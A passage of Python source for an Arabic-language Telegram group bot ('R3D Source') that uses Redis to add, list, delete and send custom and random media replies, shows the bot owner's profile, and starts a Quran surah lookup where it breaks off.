      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&photo={photo}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','صوره')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.video and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'video'
      video = m.video.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&video={video}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','فيديو')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.animation and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'animation'
      anim = m.animation.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&animation={anim}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','متحركه')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.audio and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'audio'
      aud = m.audio.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&audio={aud}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','صوت')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.voice and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'voice'
      voice = m.voice.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&voice={voice}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','بصمه')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.document and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'doc'
      doc = m.document.file_id
      if m.caption:
        caption = m.caption.html
      else:
        caption = 'None'
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&doc={doc}&caption={caption}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','ملف')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   if m.sticker and r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id, m.chat.id):
      type = 'sticker'
      stic = m.sticker.file_id
      text = r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{text}:filter:{Dev_Zaid}', f'type={type}&sticker={stic}')
      r.set(f'{text}:filtertype:{Dev_Zaid}','ملصق')
      r.set(f'{text}:filterInfo:{Dev_Zaid}', f'by={m.from_user.id}')
      r.sadd(f'FiltersList:{Dev_Zaid}', f'{text}')
      r.delete(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}')
      return m.reply(f'( {text} )\nواضفنا الرد ياحلو\n☆',parse_mode=ParseMode.HTML)
   
   
   
   
   
'''
@Client.on_message(filters.group, group=25)
def addCustomReplyDoneG(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    addreply2g(c,m,k)
    
def addreply2g(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   
   
   if m.text:
     
'''     
     
   
   
   
   

@Client.on_message(filters.group & filters.text, group=26)
def addCustomReplyRandomG(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=addreplyrandomg,args=(c,m,k)).start()
   

def addreplyrandomg(c,m,k):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')

   if r.get(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافة الرد المتعدد عام')
     return 
   
   if r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     rep = r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}')
     r.delete(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}')
     r.delete(f'{rep.decode("utf-8")}:randomfilter:{Dev_Zaid}')
     m.reply(f'{k} من عيوني لغيت اضافه الرد المتعدد عام')
     return 
     
   if r.get(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}') and text == 'الغاء':
     r.delete(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}')
     return m.reply(f'{k} من عيوني لغيت مسح الرد المتعدد العام')
   
   if r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}') and text == 'تم':
     text = r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}')
     count = len(r.smembers((f'{text}:randomfilter:{Dev_Zaid}')))
     r.set(f'{text}:randomFilter:{Dev_Zaid}', 1)
     r.sadd(f'RFiltersList:{Dev_Zaid}', text)
     r.delete(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}')
     return m.reply(f'{k} تم اضافه الرد المتعدد ( {text} )\n{k} بـ ( {count} ) جواب رد\n☆',parse_mode=ParseMode.HTML)
   
   if r.get(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
     if not r.get(f'{m.text}:randomFilter:{Dev_Zaid}'):
       r.delete(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}')
       return m.reply(f'{k} هذا الرد مو مضاف في قائمة الردود')
     else:
       r.delete(f'{m.text}:randomFilter:{Dev_Zaid}')
       r.delete(f'{m.text}:randomfilter:{Dev_Zaid}')
       r.delete(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}')
       r.srem(f'RFiltersList:{Dev_Zaid}',m.text)
       return m.reply(f'{k} ابشر مسحت الرد المتعدد ')
       
   
   if r.get(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
     r.delete(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}')
     r.set(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}',m.text)
     return m.reply(f'{k} حلو الحين ارسل اجوبة الرد\n{k} بس تخلص ارسل تم\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
   
   if r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
     text = r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}')
     r.sadd(f'{text}:randomfilter:{Dev_Zaid}', m.text.html)
     return m.reply(f'{k} حلو ضفت هذا الرد\n{k} بس تخلص ارسل تم\nـــــــــــــــــــــــــــــــــــــــــ\n`<USER_ID>` › آيدي المستخدم\n`<USER_NAME>` › اسم المستخدم\n`<USER_USERNAME>` › يوزر المستخدم\n`<USER_MENTION>` › رابط حساب المستخدم\n༄',parse_mode=ParseMode.MARKDOWN)
     
   if text == 'الردود المتعدده العامه':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
      if not r.smembers(f'RFiltersList:{Dev_Zaid}'):
       return m.reply(f'{k} مافيه ردود عشوائيه عامة')
      else:
       text = 'الردود المتعدده:\n'
       count = 1
       for reply in r.smembers(f'RFiltersList:{Dev_Zaid}'):
          rep = reply
          ttt = len(r.smembers(f'{rep}:randomfilter:{Dev_Zaid}'))
          text += f'\n{count} - ( {rep} ) ࿓ ( {ttt} )'
          count += 1
       text += '\n☆'
       return m.reply(text, disable_web_page_preview=True,parse_mode=ParseMode.HTML)
   
   if text == 'مسح الردود المتعدده العامه':
     if not dev2_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
       if not r.smembers(f'RFiltersList:{Dev_Zaid}'):
         return m.reply(f'{k} مافيه ردود عشوائيه عامة')
       else:
         count = 0
         for reply in r.smembers(f'RFiltersList:{Dev_Zaid}'):
            rep = reply
            r.delete(f'{rep}:randomfilter:{Dev_Zaid}')
            r.srem(f'RFiltersList:{Dev_Zaid}', rep)
            r.delete(f'{rep}:randomFilter:{Dev_Zaid}')
            count += 1
         return m.reply(f'{k} ابشر مسحت ( {count} ) رد متعدد ')
            
            
   
   if text == 'اضف رد متعدد عام' and not r.get(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}') and not r.get(f'{m.chat.id}:addFilterRG2:{m.from_user.id}{Dev_Zaid}'):
     if not dev2_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
       r.set(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}',1)
       return m.reply(f'{k} حلو ، ارسل الحين الكلمة الي تبيها')
   
   if text == 'مسح رد متعدد عام' and not r.get(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}'):
     if not dev2_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
     else:
       r.set(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}',1)
       return m.reply(f'{k} تمام عيني\n{k} الحين ارسل الرد عشان امسحه\n☆',parse_mode=ParseMode.HTML)
   
   
     
     
     

# ==================== FILE: group_update.py ====================
'''


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''


###########################################################################
###########################################################################
'''
@Client.on_raw_update(group=0)
def kick_from_group(app: Client, m: Update, _, __):
   try:
      name = re.search(r"first_name='([^']+)'", str(_)).group(1)
      title = re.search(r"title='([^']+)'", str(__)).group(1)
      get = app.get_me()
      if 'types.ChannelParticipantBanned' in str(m) and '"is_self": true' in str(m):
        r.delete(f'{m.chat.id}:enable:{Dev_Zaid}', int(f'-100{m.channel_id}'))
        r.srem(f'enablelist:{Dev_Zaid}', int(f'-100{m.channel_id}'))
      else:
        return False
      text = '{k} تم طرد البوت من مجموعة:\n\n'
      text += f'{k} اسم الي طردني : [{name}](tg://user?id={m.new_participant.kicked_by})\n'
      text += f'{k} ايدي الي طردني : {m.new_participant.kicked_by}\n'
      text += f'\n{k} معلومات المجموعة: \n'
      text += f'\n{k} ايدي المجموعة: `-100{m.channel_id}`'
      text += f'\n{k} اسم المجموعه: {title}'
      text += '\n{k} تم مسح جميع بيانات المجموعة'
      text += '\n\n༄'
      if r.get(f'DevGroup:{Dev_Zaid}'):
        app.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text,disable_web_page_preview=True)
      else:
        for dev in get_devs_br():
          try:
            app.send_message(int(dev), text, disable_web_page_preview=True)
            time.sleep(3)
          except:
            pass
   except Exception as e:
     print (e)
''' 
## الردود
@Client.on_message(filters.text & filters.group, group=1)
def globalHandler(c,m):
   Thread(target=global_filter,args=(c,m)).start()

def global_filter(c,m):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:lock_global:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addFilterG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delFilterG:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addFilter2GG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{text}:filter:{Dev_Zaid}'):
     get = r.get(f'{text}:filter:{Dev_Zaid}')
     type = re.search(r'type=([^&]+)', get).group(1)
     userID = str(m.from_user.id)
     userNAME = str(m.from_user.first_name)
     userUSERNAME = "@"+m.from_user.username if m.from_user.username else "مافي يوزر"
     userMENTION = m.from_user.mention(userNAME[:25])
     if type == 'text':
        return m.reply(get.split('&text=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION), disable_web_page_preview=True)
     
     if type == 'photo':
        photo = re.search(r'photo=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_photo(photo, caption=cpt)
     
     if type == 'video':
        video = re.search(r'video=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_video(video, caption=cpt)
     
     if type == 'voice':
        voice = re.search(r'voice=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_voice(voice, caption=cpt)
     
     if type == 'animation':
        animation = re.search(r'animation=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_animation(animation, caption=cpt)
     
     if type == 'audio':
        audio = re.search(r'audio=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_audio(audio, caption=cpt)
     
     if type == 'doc':
        doc = re.search(r'doc=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        return m.reply_document(doc, caption=cpt)

     if type == 'sticker':
        return m.reply_sticker(get.split('&sticker=')[1])
   
   
   
   if text == 'المطور':
     id = int(r.get(f'{Dev_Zaid}botowner'))
     get = c.get_chat(id)
     if not get.bio:
       bio = None
     else:
       bio = get.bio
     reply_markup= InlineKeyboardMarkup (
       [[InlineKeyboardButton (get.first_name, user_id=id)]]
     )
     if not get.photo:
       return m.reply_animation('https://telegra.ph/file/d9127c65922817d127f04.mp4',caption=bio,reply_markup=reply_markup)
     else:
       get_user = c.invoke(GetFullUser(id=(c.resolve_peer(id))))
       photo = get_user.full_user.profile_photo
       video = photo.video_sizes[0] if photo.video_sizes else None
       if video:
         file = BytesIO()
         for byte in c.stream_media(
                message=FileId(
                  file_type=FileType.PHOTO,
                  dc_id=photo.dc_id, media_id=photo.id,
                  access_hash=photo.access_hash,
                  file_reference=photo.file_reference,
                  thumbnail_source=ThumbnailSource.THUMBNAIL,
                  thumbnail_file_type=FileType.PHOTO,
                  thumbnail_size=video.type,
                  volume_id=0, local_id=0
                ).encode()
         ):
           file.write(byte)
           file.name = f'{id}vid.mp4'
           return m.reply_animation(file, caption=bio,reply_markup=reply_markup)
       else:
         for photo in c.get_chat_photos(id, limit=1):
           return m.reply_photo(photo.file_id, caption=bio, reply_markup=reply_markup)
        
        
        
@Client.on_message(filters.text & filters.group, group=2)
def filtersHandler(c,m):
   
   Thread(target=get_filter,args=(c,m)).start()

def get_filter(c,m):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
   if r.get(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:lock_filter:{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{text}:filter:{Dev_Zaid}{m.chat.id}'):
     get = r.get(f'{text}:filter:{Dev_Zaid}{m.chat.id}')
     type = re.search(r'type=([^&]+)', get).group(1)
     userID = str(m.from_user.id)
     userNAME = str(m.from_user.first_name)
     userUSERNAME = "@"+m.from_user.username if m.from_user.username else "مافي يوزر"
     userMENTION = m.from_user.mention(userNAME[:25])
     if type == 'text':
         m.reply(get.split('&text=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION), disable_web_page_preview=True)
     
     if type == 'photo':
        photo = re.search(r'photo=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_photo(photo, caption=cpt)
     
     if type == 'video':
        video = re.search(r'video=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_video(video, caption=cpt)
     
     if type == 'voice':
        voice = re.search(r'voice=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_voice(voice, caption=cpt)
     
     if type == 'animation':
        animation = re.search(r'animation=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_animation(animation, caption=cpt)
     
     if type == 'audio':
        audio = re.search(r'audio=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_audio(audio, caption=cpt)
    
     if type == 'doc':
        doc = re.search(r'doc=([^&]+)', get).group(1)
        caption = get.split('&caption=')[1].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION)
        if caption == 'None':
           cpt = None
        else:
           cpt = caption
        m.reply_document(doc, caption=cpt)

     if type == 'sticker':
         m.reply_sticker(get.split('&sticker=')[1])
        
   if r.get(f'{text}:filterMEM:{Dev_Zaid}{m.chat.id}') and not r.get(f'{m.chat.id}:lock_filterMEM:{Dev_Zaid}'):
     id = int(r.get(f'{text}:filterMEM:{Dev_Zaid}{m.chat.id}'))
     get = c.get_chat(id)
     cap = f"𖡋 𝐍𝐀𝐌𝐄 ⌯ [{get.first_name}](tg://user?id={get.id})\n𖡋 𝐈𝐃 ⌯ `{get.id}`"
     if not get.bio:
       pass
     else:
       cap+=f"\n`{get.bio}`"
     if get.username:
       reply_markup= InlineKeyboardMarkup (
       [[InlineKeyboardButton (get.first_name, user_id=id)]]
       )
     else:
       reply_markup=None
     if not get.photo:
       return m.reply(cap,reply_markup=reply_markup)
     else:
       get_user = c.invoke(GetFullUser(id=(c.resolve_peer(id))))
       photo = get_user.full_user.profile_photo
       hash = photo.access_hash
       if r.get(f"{hash}:{id}"):
         return m.reply_animation(r.get(f"{hash}:{id}"), caption=cap, reply_markup=reply_markup) 
       video = photo.video_sizes[0] if photo.video_sizes else None
       if video:
         file = BytesIO()
         for byte in c.stream_media(
                message=FileId(
                  file_type=FileType.PHOTO,
                  dc_id=photo.dc_id, media_id=photo.id,
                  access_hash=photo.access_hash,
                  file_reference=photo.file_reference,
                  thumbnail_source=ThumbnailSource.THUMBNAIL,
                  thumbnail_file_type=FileType.PHOTO,
                  thumbnail_size=video.type,
                  volume_id=0, local_id=0
                ).encode()
         ):
           file.write(byte)
           file.name = f'{id}vid.mp4'
           a= m.reply_animation(file, caption=cap,reply_markup=reply_markup)
           return r.set(f"{hash}:{id}", a.animation.file_id, ex=120)
       else:
         for photo in c.get_chat_photos(id, limit=1):
           return m.reply_photo(photo.file_id, caption=cap, reply_markup=reply_markup)
      



@Client.on_message(filters.text & filters.group, group=3)
def globalRandomupdate(c,m):
   Thread(target=get_rngp,args=(c,m)).start()
   
def get_rngp(c,m):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.chat.id}:lock_global:{Dev_Zaid}'):  return 
   
   if m.from_user:
     if r.get(f'{m.chat.id}:addFilterRG:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delFilterRG:{m.from_user.id}{Dev_Zaid}'):  return 
     if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
     if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   userID = str(m.from_user.id)
   userNAME = str(m.from_user.first_name)
   userUSERNAME = "@"+m.from_user.username if m.from_user.username else "مافي يوزر"
   userMENTION = m.from_user.mention(userNAME[:25])
   if r.get(f'{text}:randomFilter:{Dev_Zaid}'):
     if r.smembers(f'{text}:randomfilter:{Dev_Zaid}'):
       list = r.smembers(f'{text}:randomfilter:{Dev_Zaid}')
       return m.reply(random.sample(list,1)[0].replace('{اسم_البوت}',name).replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION), disable_web_page_preview=True)
   name2 = ' '.join(i for i in name)
   
   
   sb = [
"عييييييييب","عيب","ياكلب عيب","يا قليل التربيه","يا قليل الادب","؟؟؟؟؟؟","ياليت تتأدب","بقص لسانك","حاضر","ياخي عيب","؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟","استغفر الله",
   ]
   lovem = [
"يلبيييه",
"اكثر",
"يعمري",
"اعشقك",
"بدينا كذب",
"احلى من يحبني",
"يحظي والله",
"اكثر اكثر اكثرر",
"يروحي",
"اموت فيك",]
   zg = [
"عييييييييب","عيب","زق بوجهك","يا قليل التربيه","يا قليل الادب","؟؟؟؟؟؟","ياليت تتأدب","بقص لسانك","حاضر","ياخي عيب","؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟",]
   mm = [
"ابركها من ساعة","احبك","اكثر","ترا ازعجتنا","انقلع","طيب","مو اكثر مني","وبعدين ؟","جت من الله","توكل بس"]
   if text == 'بوت':
      m.reply(random.choice(bot_r))
   
   if text == name:
     m.reply(random.choice(bot_name))
     
   '''
   if text in list_UwU:
     m.reply(random.choice(sb))
   '''
   
   if text == 'احبك':
     m.reply(random.choice(lovem))
   
   if text == 'اكرهك':
     m.reply(random.choice(mm))
   
   if text == 'كليزق' or text == 'كلزق':
     m.reply(random.choice(zg))
   
   if text.startswith('سورة ') or text.startswith('سوره '):
      soura = text.split(None,1)[1].replace('أ','ا').replace('إ','ا').replace('آ','ا').replace('ٰ','').replace('ة','ه')
      if f'سورة {soura}' in TheHolyQuran:
